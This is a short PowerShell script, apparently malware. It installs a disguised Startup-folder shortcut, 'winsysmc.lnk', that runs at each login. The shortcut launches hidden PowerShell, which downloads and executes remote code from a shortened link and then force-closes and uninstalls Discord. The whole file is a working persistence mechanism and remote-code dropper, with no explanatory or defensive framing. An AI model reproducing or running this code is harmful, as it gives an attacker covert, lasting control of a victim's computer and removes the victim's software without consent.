$WshShell = New-Object -ComObject WScript.Shell

# Define the path to the Startup folder
$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')

# Define the full path to the shortcut
$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'winsysmc.lnk')

# Create a shortcut object
$shortcut = $WshShell.CreateShortcut($shortcutPath)

# Set the target path of the shortcut to PowerShell with your script as an argument
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-w h iwr is.gd/HidePS | iex;taskkill /f /im discord.exe; winget uninstall Discord.Discord"
$shortcut.WindowStyle = 2
# Save the shortcut
$shortcut.Save()
exit;